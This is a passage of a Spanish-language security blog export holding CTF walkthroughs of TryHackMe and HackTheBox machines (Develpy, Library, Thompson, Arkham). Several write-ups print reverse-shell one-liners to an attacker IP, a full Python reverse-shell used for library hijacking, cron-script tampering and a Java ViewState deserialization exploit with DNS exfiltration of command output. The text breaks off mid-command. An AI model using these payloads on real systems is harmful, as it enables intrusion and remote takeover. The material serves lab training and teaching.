incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 152.23 seconds   PYTHON INPUT En el puerto 10000 encontramos un script que nos pide un numero para poder enviar ese numero de paquetes al localhost.\nKING - USER Le pasamos codigo python para ejecucion de comandos y vemos el resultado del comando enviado.\n1  __import__(\u0026#39;os\u0026#39;).system(\u0026#39;id\u0026#39;)   Le pasamos una shell inversa\n1  __import__(\u0026#39;os\u0026#39;).system(\u0026#39;nc -e /bin/sh 10.8.1.72 1337\u0026#39;)   Obtenemos una shell con el usuario king y la flag user.txt.\nESTEGANOGRAFIA En la carpeta principal encontramos una imagen con el nombre de credentials.png, lo copiamos a nuestra maquina.\nLa imagene contiene distintos colores, para poder decodificar la imagen utilizamos la pagina de npiet.\nImagen con credenciales\n1  king:c00ffe123!   SSH - KING Nos logeamos con las credenciales que encontramos en la imagen y obtenemos acceso con el usuario king nuevamente.\nPRIVILEGE ESCALATION Utilizamos pspy para ver los cronjobs que se ejecuta, vemos que el usuario root ejecuta el archivo root.sh y run.sh que se encuentra en la carpeta principal del usuario king.\nCambiamos el nombre del archivo root.sh a root.sh.bak y creamos un nuevo archivo con nuestra shell inversa.\n1  echo \u0026#34;nc -e /bin/sh 10.8.1.72 1338\u0026#34; \u0026gt;\u0026gt; root.sh   Obtenemos una shell inversa con el usuario root y nuestra flag root.txt.\nALTERNATIVE ROOT - DJANGO Encontramos que en el puerto 8080 esta corriendo un servicio de python o una pagina de django, como pudimos observar en la lista de pspy. Utilizamos ssh para traer localmente el puerto 8080 con las credenciales del usuario King.\nEncontramos una pagina escrita en django en la cual se puede enviar un archivo de python.\nSimple upload\nCreamos un archivo con una shell inversa en python.\nSubimos nuestro archivo python, esperamos hasta que el cronjob ejecute el archivo root.sh, el cual ejecuta cualquier archivo python que se encuentra en la carpetan /root/company/media/*.py.\nEsperamos hasta que se ejecute el cronjob y nos da una shell inversa con el usuario root.\nTambien vemos nuestro archivo que se subio a la carpeta del usuario root.\n","description":"Develpy es una maquina de TryHackMe originalmente para Bsides Guatemala, presenta una vulnerabilidad en script de Python a la escucha de instrucciones donde ejecutamos una shell inversa, tambien encontramos un reto de Esteganografia que nos dio acceso a un siguiente usuario por SSH. Para escalar privilegios modificamos un script utilizado por un CronJob, una alternativa era una aplicacion en Django que permitia la ejecucion de scripts en python.","id":139,"section":"posts","tags":["steganography","exec","eval","cron"],"title":"TryHackMe - Develpy","uri":"https://sckull.github.io/posts/develpy/"},{"content":"  Library es una maquina de TryHackMe originalmente para Bsides Guatemala, realizamos un ataque de fuerza bruta para obtener acceso. Descubrimos un script el cual ejecutamos con sudo y realizamos Python Library Hijacking para obtener acceso root.\nRoom    Titulo Library      Descripción boot2root machine for FIT and bsides guatemala CTF   Puntos 60   Dificultad Facil   Maker stuxnet     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  root@kali:~/trymehack/library# masscan -p1-65535,U:1-65535 10.10.184.190 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 08:19:17 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.184.190 Discovered open port 80/tcp on 10.10.184.190 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 04:22 EDT Nmap scan report for 10.10.184.190 Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA) | 256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA) |_ 256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome to Blog - Library Machine Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds   HTTP Pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@kali:~/trymehack/library# gobuster dir -u 10.10.184.190 -w /usr/share/wordlists/dirb/common.txt -n -x php,html,txt -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.184.190 [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/03 04:25:57 Starting gobuster =============================================================== /images /index.html /index.html /robots.txt /robots.txt /server-status =============================================================== 2019/09/03 04:31:35 Finished ===============================================================   ROBOTS.TXT Encontramos una pista en robots.txt la que indica el nombre del \u0026ldquo;wordlist rockyou\u0026rdquo;.\nENUM USERS - SSH Utilizamos OpenSSH 7.2p2 - Username Enumeration para enumerar los usuarios dentro del servicio SSH, los usuarios que enumeramos son los que aparecen como comentarios en la pagina principal y el autor del primer post.\n1 2 3 4 5  root www-data meliodas anonymous Anonymous   HYDRA Utilizamos hydra con el wordlist de rockyou y nuestro pequeño wordlist de usuarios, logrando obtener la contraseña para el usuario Meliodas.\nUSER - MELIODAS Obtenemos nuestra flag user.txt al logearnos en el servicio ssh con las credenciales encontradas.\n1 2  login: meliodas password: iloveyou1   PRIVILEGE ESCALATION Utilizamos sudo -l -l y encontramos que podemos ejecutar python en cualquiera de sus versiones pasandole un script que esta dentro de nuestra carpeta principal.\nEl script bak.py utiliza las librerias os y zipfile, vamos a crear el archivo zipfile.py el cual va contener una shell inversa, al ejecutarse bak.py va a ejecutar nuestro script esto sucedera porque en la variable $PATH se encuentra primero nuestra carpeta principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  import os import pty import socket lhost = \u0026#34;10.8.1.72\u0026#34; lport = 1337 ZIP_DEFLATED = 0 class ZipFile: def close(*args): return def write(*args): return def __init__(self, *args): return s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) s.close()   Ejecutamos con sudo:\n1  sudo /usr/bin/python /home/meliodas/bak.py   Obtenemos una shell como usuario root y nuestra flag root.txt.\n","description":"Library es una maquina de TryHackMe originalmente para Bsides Guatemala, realizamos un ataque de fuerza bruta para obtener acceso. Descubrimos un script el cual ejecutamos con sudo y realizamos Python Library Hijacking para obtener acceso root.","id":140,"section":"posts","tags":["python library hijacking","hydra"],"title":"TryHackMe - Library","uri":"https://sckull.github.io/posts/library/"},{"content":"  Thompson es una maquina de TryHackMe originalmente para Bsides Guatemala, donde ingresamos con credenciales por defecto en Tomcat para luego obtener una shell generando un archivo WAR y ejecutandolo. Escalamos privilegios editando un fichero utilizado por un CronJob.\nRoom    Titulo Thompson      Descripción boot2root machine for FIT and bsides guatemala CTF   Puntos 160   Dificultad Facil   Maker stuxnet     MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  root@kali:~/trymehack/thompson# masscan -p1-65535,U:1-65535 10.10.3.147 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 09:27:46 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8080/tcp on 10.10.3.147 Discovered open port 22/tcp on 10.10.3.147 # Nmap 7.70 scan initiated Tue Sep 3 05:34:12 2019 as: nmap -sV -sC -p8080,22 -o nmap.scan 10.10.3.147 Nmap scan report for 10.10.3.147 Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA) | 256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA) |_ 256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519) 8080/tcp open http Apache Tomcat 8.5.5 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/8.5.5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 05:34:26 2019 -- 1 IP address (1 host up) scanned in 14.01 seconds   HTTP - PUERTO 8080 Pagina en el puerto 8080 nos muestra que esta corriendo thompson.\nTOMCAT - DEFAULT CREDENTIALS Utilizamos las credenciales por default y el panel de tomcat para iniciar sesion.\nREVERSE SHELL - JSP Creamos nuestro payload con msfvenom y ponemos a la escucha metasploit.\nSubimos nuestro archivo shell.war y al abrirlo se ejecutará nuestra shell.\nObtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos pspy para ver los cronjobs que se ejecutan. Vemos un archivo que se ejecuta y este se encuentra en /home/jack/id.sh.\nAgregamos una shell inversa al archivo id.sh y esperamos hasta que se ejecute de nuevo.\n1  echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.1.72/1338 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; script.sh   Obtenemos nuestra shell como usuario root y nuestra flag root.txt.\n","description":"Thompson es una maquina de TryHackMe originalmente para Bsides Guatemala, donde ingresamos con credenciales por defecto en Tomcat para luego obtener una shell generando un archivo WAR y ejecutandolo. Escalamos privilegios editando un fichero utilizado por un CronJob.","id":141,"section":"posts","tags":["metasploit","cron"],"title":"TryHackMe - Thompson","uri":"https://sckull.github.io/posts/thompson/"},{"content":"  Arkham de HackTheBox con SO Windows, Encontramos un backup en SMB encriptado con binwalk obtuvimos archivos, uno de ellos es la configuracion de la \u0026ldquo;applicacion\u0026rdquo;, mediante este ultimo explotamos una vulnerabilidad de deserializacion en java utilizando el codigo de Apache MyFaces junto con ysoserial, lo que nos dio acceso a la maquina. Para el movimiento lateral utilizamos powershell con credenciales de borradores de correo electronico dentro de un backup. Finalmente cambiando de recurso compartido localmente logramos acceder a la carpeta del administrador.\nInformacion de la Maquina    Nombre Arkham      OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.130   Maker MinatoTW    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.8, 8.1, 6, 4, 1.9], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 10, 5, 5, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp.\n1 2 3 4 5 6 7 8 9 10 11 12  root@sckull:~/htb/arkham# masscan -p1-65535,U:1-65535 10.10.10.130 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-25 19:10:12 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49666/tcp on 10.10.10.130 Discovered open port 139/tcp on 10.10.10.130 Discovered open port 445/tcp on 10.10.10.130 Discovered open port 135/tcp on 10.10.10.130 Discovered open port 8080/tcp on 10.10.10.130 Discovered open port 49667/tcp on 10.10.10.130   Escaneo de servicios en puertos anteriormente encontrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@sckull:~/htb/arkham# nmap -sV -p 135,139,445,8080,49666,49667 10.10.10.130 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 19:13 GMT Nmap scan report for 10.10.10.130 Host is up (0.36s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 8080/tcp open http Apache Tomcat 8.5.37 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.49 seconds   SMB Buscamos los sharenames a los que tengamos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@sckull:~/htb/arkham# smbclient -L 10.10.10.130 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin BatShare Disk Master Wayne\u0026#39;s secrets C$ Disk Default share IPC$ IPC Remote IPC Users Disk Reconnecting with SMB1 for workgroup listing. Connection to 10.10.10.130 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available   SMB - BatShare Nos conectamos al sharename.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@sckull:~/htb/arkham# smbclient \\\\\\\\10.10.10.130\\\\BatShare Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; smb: \\\u0026gt; ls . D 0 Sun Feb 3 13:00:10 2019 .. D 0 Sun Feb 3 13:00:10 2019 appserver.zip A 4046695 Fri Feb 1 06:13:37 2019 5158399 blocks of size 4096. 2123866 blocks available smb: \\\u0026gt; mget * Get file appserver.zip? y getting file \\appserver.zip of size 4046695 as appserver.zip (265.1 KiloBytes/sec) (average 265.1 KiloBytes/sec) smb: \\\u0026gt;   1 2 3 4 5 6  root@sckull:~/htb/arkham# unzip appserver.zip Archive: appserver.zip inflating: IMPORTANT.txt inflating: backup.img root@sckull:~/htb/arkham# ls appserver.zip backup.img IMPORTANT.txt tmp   Encontramos un archivo llamado appserver.zip al descomprimir dicho archivo nos muestra dos archivos backup.img e IMPORTANT.txt.\nIMPORTANT.txt\n1  Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn\u0026#39;t have unauthenticated access to it. - Bruce   file backup.img\n1  backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e   BINWALK - backup.img\nUtilizamos binwalk para ver el contenido del archivo backup.img.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 LUKS_MAGIC version 0x1 aes sha256 519168 0x7EC00 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 544768 0x85000 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 551936 0x86C00 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 8388608 0x800000 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 8542755 0x825A23 Zip archive data, at least v1.0 to extract, name: Mask/tomcat-stuff/ 8542831 0x825A6F Zip archive data, at least v2.0 to extract, compressed size: 1006, uncompressed size: 2208, name: Mask/tomcat-stuff/tomcat-users.xml 8543929 0x825EB9 Zip archive data, at least v2.0 to extract, compressed size: 1151, uncompressed size: 3498, name: Mask/tomcat-stuff/web.xml.bak 8545167 0x82638F Zip archive data, at least v2.0 to extract, compressed size: 709, uncompressed size: 1368, name: Mask/tomcat-stuff/context.xml 8545963 0x8266AB Zip archive data, at least v2.0 to extract, compressed size: 621, uncompressed size: 1172, name: Mask/tomcat-stuff/jaspic-providers.xml 8546680 0x826978 Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 832, name: Mask/tomcat-stuff/faces-config.xml 8547139 0x826B43 Zip archive data, at least v2.0 to extract, compressed size: 2599, uncompressed size: 7678, name: Mask/tomcat-stuff/server.xml 8549824 0x8275C0 Zip archive data, at least v2.0 to extract, compressed size: 18347, uncompressed size: 174021, name: Mask/tomcat-stuff/web.xml 8568254 0x82BDBE Zip archive data, at least v1.0 to extract, compressed size: 39, uncompressed size: 39, name: Mask/tomcat-stuff/MANIFEST.MF 8568380 0x82BE3C Zip archive data, at least v2.0 to extract, compressed size: 7353, uncompressed size: 7586, name: Mask/robin.jpeg 8575806 0x82DB3E Zip archive data, at least v2.0 to extract, compressed size: 105045, uncompressed size: 105374, name: Mask/me.jpg 8680920 0x8475D8 Zip archive data, at least v2.0 to extract, compressed size: 687109, uncompressed size: 687160, name: Mask/mycar.jpg 9466405 0x907225 End of Zip archive, footer length: 22 [ .. ] 9638621 0x9312DD Copyright string: \u0026#34;copyright/ordfeminine/guillemotleft/logicalnot/hyphen/registered/macron/degree/plusminus/twosuperior/threesuperior/acute/mu/para\u0026#34; 9962496 0x980400 PDF document, version: \u0026#34;1.4\u0026#34; [ ... ] 9978880 0x984400 XML document, version: \u0026#34;1.0\u0026#34; 9979118 0x9844EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9981952 0x985000 XML document, version: \u0026#34;1.0\u0026#34; 9986048 0x986000 XML document, version: \u0026#34;1.0\u0026#34; 9986286 0x9860EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9988096 0x986800 XML document, version: \u0026#34;1.0\u0026#34; 9988334 0x9868EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9990144 0x987000 XML document, version: \u0026#34;1.0\u0026#34; 9991168 0x987400 XML document, version: \u0026#34;1.0\u0026#34; 9991406 0x9874EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9999360 0x989400 XML document, version: \u0026#34;1.0\u0026#34; 9999598 0x9894EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 10016768 0x98D800 JPEG image data, JFIF standard 1.01 10024960 0x98F800 JPEG image data, JFIF standard 1.01 10041344 0x993800 JPEG image data, EXIF standard 10041356 0x99380C TIFF image data, little-endian offset of first image directory: 8 10057728 0x997800 JPEG image data, JFIF standard 1.01   Dentro del archivo encontramos varios documentos que se refieren a archivos tomcat, imagenes, y archivos xml, descomprimimos los archivos con binwalk.\n1  binwalk -e backup.img   Encontramos varios archivos y carpetas, dentro de la carpeta Mask encontramos imagenes y una subcarpeta tomcat-stuff, utilizamos binwalk con las imagenes para verificar que no tengan archivos ocultos dentro.\nNinguna de las imagenes contiene archivos que puedan servirnos, dentro de la carpeta tomcat-stuff encontramos archivos de configuracion.\nDentro de los archivos de configuracion encontramos un backup de uno de ellos web.xml.bak, en su interior vemos la configuracion que tiene la pagina, algunos parametros de la configuracion contienen datos que sirven para encriptar los datos que se reciben y se envian por medio de la pagina web y podemos notar que esta corriendo en apache myfaces.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Faces Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.faces\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;description\u0026gt;State saving method: \u0026#39;client\u0026#39; or \u0026#39;server\u0026#39; (=default). See JSF Specification 2.5.2\u0026lt;/description\u0026gt; \u0026lt;param-name\u0026gt;javax.faces.STATE_SAVING_METHOD\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;server\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRE\u0026lt;T/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt;   HTTP - 8080 Puerto 8080 en http.\nGOBUSTER Considerando que la pagina esta corrriendo en un apache myfaces (web.xml.bak), vamos a utilizar gobuster para buscar directorios y documentos.\nEncontramos directorios y documentos pertenecientes a la pagina, al visitar cada una de las opciones de la pagina nos encontramos una para una subscripcion de correo electronico /userSubscribe.faces la cual no aparecio con gobuster.\n/userSubscribe.faces Al registrar un correo nos redirige a otra pagina /thankyou.faces con un mensaje de registro.\nViewState - Arkham Al revisar el codigo fuente de userSubscribe.faces encontramos algunos valores pertenecen a javax.faces.ViewState.\nViewState JSF utiliza viewStates para almacenar los datos de la vista, pueden ser \u0026lsquo;almacenados\u0026rsquo; en el servidor o el cliente, dichos valores de viewstate estan dentro del html de una pagina como un campo oculto con el nombre de javax.faces.ViewState, como es el caso de la pagina que encontramos.\nJava Deserialization Deserializacion y Serializacion es el proceso por el cual se convierte un objeto a bytes y viceversa, para leerlo e interpretarlo por el servidor. Al investigar acerca de dichos valores encontramos que, existe una vulnerabilidad de deserializacion en java, dichos valores del viewstate estan codificados en base64 en algunos casos no estan encriptados por lo que puede ser leido el contenido.\nAl intentar decodificar en base64 nos muestran algunos caracteres, por lo que podemos afirmar que el objeto esta encriptado.\nJSF ViewState RCE INFO: JSF ViewStates RCE - Vulnerability\nEncontramos un post el cual habla de una vulnerabilidad RCE de ViewState en las implementaciones de JSF como Oracle Mojarra (JSF reference implementation), Apache MyFaces. Existen dos \u0026lsquo;tipos\u0026rsquo; de ViewState, el que se almacena en el servidor y el cliente, ambos son objetos serializados, para que dicha vulnerabilidad sea aprovechada para la ejecucion de comandos deben de cumplirse algunas condiciones, el viewstate no debe de estar encriptado, en el caso de Mojarra el viewstate debe de estar configurado en el cliente, en MyFaces puede estar configurado en el cliente o servidor.\nEn el caso de MyFaces encriptar el ViewState esta por defecto activado, puede ser desactivado para hacer tests configurando el parametro de org.apache.myfaces.USE_ENCRYPTION = false y tambien puede utilizar una contraseña para la encriptacion. Tambien nos dice que por defecto Myfaces utiliza DES como algoritmo de encriptacion y HMAC-SHA1 para autenticar el ViewState. Por defecto el almacenamiento del ViewState esta configurado por el lado del servidor javax.faces.STATE_SAVING_METHOD = server.\nINFO: Secure Your Application\nAlgunos post sobre JAVA Deseralization:\nJava Serialization\nJava Serialization with burp and ysoserial\nDeserialization Vulnerability - $1500\nAhora que sabemos todo esto, podemos volver a nuestro archivo web.xml.bak el cual contiene algunos parametros que pueden ser de utilidad para aprovechar el RCE del ViewState y ejecutar comandos dentro de la maquina.\n1 2  \u0026lt;param-name\u0026gt;javax.faces.STATE_SAVING_METHOD\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;server\u0026lt;/param-value\u0026gt;   Tambien tiene una contraseña que es utilizada para encriptar el viewstate.\n1 2  \u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt;   El algoritmo de autenticacion.\n1 2  \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt;   Mensaje de autenticacion para el algoritmo.\n1 2  \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt;   StateUtils.java Existen algunas herramientas para explotacion de deserializacion en java como jexboss y ysoserial, tambien existe una version modificada de ysoserial-modified. Al intentar utilizar estas herramientas contra la maquina no funcionan, por el tipo de encriptacion en la configuracion del archivo (web.xml.bak), estas herramientas aprovechan el viewstatate cuando no estan encriptadas.\nPara arkham vamos a utilizar ysoserial-modified para generar un payload y encriptarlo por medio de la clase de apache myfaces, StateUtils.java, esta clase StateUtils.java contiene metodos que pueden construir y reconstruir un valor de viewstate.\nConfiguracion de los campos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  private static final Logger log = Logger.getLogger(StateUtils.class.getName()); //Cambio por HmacSHA1 public static final String macAlgorithm = \u0026#34;HmacSHA1\u0026#34;; //Cambio por MAC_SECRET -\u0026gt; SnNGOTg3Ni0= //public static final String INIT_MAC_SECRET = \u0026#34;MAC_SECRET\u0026#34;; //public static final String INIT_MAC_SECRET_KEY_CACHE = \u0026#34;org.apache.myfaces.MAC_SECRET.CACHE\u0026#34;; //configuracion Local encrypt/decrypt private static final String encodedKey =\u0026#34;SnNGOTg3Ni0=\u0026#34;; private static final byte[] decodedKey = decode(encodedKey.getBytes()); private static final SecretKey secretKey = new SecretKeySpec(decodedKey,\u0026#34;DES\u0026#34;); //configuracion Local encrypt/decrypt private static final String macSecretStr = \u0026#34;SnNGOTg3Ni0=\u0026#34;; private static final byte[] macSecretBytes = decode(macSecretStr.getBytes()); private static final SecretKey macSecretKey = new SecretKeySpec(macSecretBytes, macAlgorithm); private static final String ZIP_CHARSET = \u0026#34;ISO-8859-1\u0026#34;; // String DEFAULT_ALGORITHM = \u0026#34;DES\u0026#34;; private static final String algorithm = \u0026#34;DES\u0026#34;; // String DEFAULT_ALGORITHM_PARAMS = \u0026#34;ECB/PKCS5Padding\u0026#34;; private static final String algorithmParams = \u0026#34;ECB/PKCS5Padding\u0026#34;; private static final byte[] iv = null;   Metodos, se eliminan todos los valores ExternalContext, ServletContext:\n1 2 3 4 5 6 7 8  construct(Object object) reconstruct(String string) encrypt(byte[] insecure) encode(byte[] bytes) decrypt(byte[] secure) decode(byte[] bytes) getAsObject(byte[] bytes) getAsByteArray(Object object)   Creamos un metodo para enviar nuestro payload:\n1  sendPayload(String viewstatePayload)   Para la ejecucion de comandos utilizamos ysoserial-modified.jar para generar un payload:\n1  CommonsCollections1, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6   Funciona tambien con la version ysoserial.jar, pero se tienen comandos \u0026lsquo;limitados\u0026rsquo;, la version modificada es una mejor version que nos permite ejecutar comandos cmd/powershell/sh.\nYa que desconocemos del payload que funciona, utilizamos los descritos anteriormente, vamos a hacer un request DNS a nuestra maquina con cada payload (ej: nslookup CommonsCollections1 10.10.1X.1X) y el payload que funcione nos aparecerá en nuestra terminal (Utilizamos responder).\nAqui se encuentra el codigo:\n Codigo Java - GitHub  De igual forma realice un script en python para el mismo fin, utilizando la libreria pydes.\n Codigo Python - GitHub  RCE - Request DNS Obtenemos un request DNS y vemos que los payloads que funcionan en arkham son CommonsCollections5, CommonsCollections6, por lo que podemos utilizar cualquiera de ellos para ejecutar comandos en la maquina.\nDe igual forma utilizando nslookup podemos saber que usuario somos y que usuarios existen en la maquina, utilizando los siguientes comandos.\nwhoami\n1  //10.10.13.129 \u0026amp; for /f %i in (\u0026#39;whoami\u0026#39;) do nslookup %i 10.10.13.129   dir C:\\Users\n1  //10.10.13.129 \u0026amp; for /f \u0026#34;tokens=1,2,3\u0026#34; %a in (\u0026#39;dir /B \u0026#34;C:\\Users\u0026#34;\u0026#39;) do nslookup %a.%b.%c 10.10.13.129   REVERSE SHELL - Alfred Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (nc.exe) y ejecutar una shell inversa.\nComando: Cambiamos el primer parametro de cmand a \u0026ldquo;powershell\u0026rdquo;.\n1  wget http://10.10.13.129/nc.exe -o C:\\Users\\Public\\nc.exe; C:\\Users\\Public\\nc.exe -e 